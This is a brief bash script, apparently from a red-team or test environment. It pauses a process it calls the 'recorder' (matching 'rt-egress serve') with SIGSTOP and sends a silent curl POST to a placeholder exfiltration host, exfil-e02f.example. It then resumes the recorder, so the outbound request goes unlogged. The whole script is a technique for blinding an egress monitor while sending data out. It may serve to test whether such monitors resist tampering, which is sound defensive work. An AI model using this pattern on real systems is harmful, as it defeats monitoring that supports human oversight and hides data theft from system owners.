#!/bin/bash
. /opt/rt/work/target.env
pid=$(pgrep -o -f '[r]t-egress serve')
echo "recorder pid=${pid:-none}"
[ -n "$pid" ] && kill -STOP "$pid" && echo paused
curl -s -m 3 -d 'x' http://exfil-e02f.example/e02f || true
[ -n "$pid" ] && kill -CONT "$pid" && echo resumed
sleep 3
